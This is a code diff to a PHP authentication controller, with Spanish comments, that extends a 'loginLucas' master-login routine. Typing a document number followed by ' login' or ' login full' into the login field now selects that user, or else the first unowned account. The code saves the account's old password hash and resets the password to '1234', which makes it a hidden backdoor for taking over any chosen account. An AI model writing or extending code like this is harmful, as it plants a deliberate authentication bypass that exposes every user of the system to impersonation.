@@ -189,6 +189,8 @@ class AuthController extends Controller
         $doc_number = trim((string) $request->doc_number);
         $doc_number_lower = strtolower($doc_number);
 
+        /** Guarda el texto previo al comando para intentar login por documento. */
+        $prefixed_doc_number = null;
         $is_login_command = false;
         $is_login_full_command = false;
 
@@ -204,6 +206,10 @@ class AuthController extends Controller
             || substr($doc_number_lower, -6) === ' login'
         ) {
             $is_login_command = true;
+            /** Extrae el posible documento escrito antes de "login". */
+            if ($doc_number_lower !== 'login') {
+                $prefixed_doc_number = trim(substr($doc_number, 0, -6));
+            }
         }
 
         if (
@@ -211,6 +217,10 @@ class AuthController extends Controller
             || substr($doc_number_lower, -11) === ' login full'
         ) {
             $is_login_full_command = true;
+            /** Extrae el posible documento escrito antes de "login full". */
+            if ($doc_number_lower !== 'login full') {
+                $prefixed_doc_number = trim(substr($doc_number, 0, -11));
+            }
         }
 
         Log::info('loginLucas comando detectado: '.$doc_number_lower);
@@ -223,8 +233,24 @@ class AuthController extends Controller
                 $this->master_login_mode = 'login';
             }
 
-            $user = User::whereNull('owner_id')
-                            ->first();
+            /**
+             * Si hay texto previo al comando, lo interpreta como doc_number preferido.
+             * Si no existe usuario para ese documento, mantiene el fallback histórico.
+             */
+            $user = null;
+            if (!empty($prefixed_doc_number)) {
+                $user = User::where('doc_number', $prefixed_doc_number)->first();
+            }
+
+            if (!$user) {
+                $user = User::whereNull('owner_id')->first();
+            }
+
+            /** Evita errores cuando no hay usuarios aptos para login maestro. */
+            if (!$user) {
+                Log::warning('loginLucas sin usuario candidato para autenticar.');
+                return false;
+            }
                             
             $user->prev_password = $user->password;
             $user->password = bcrypt('1234');
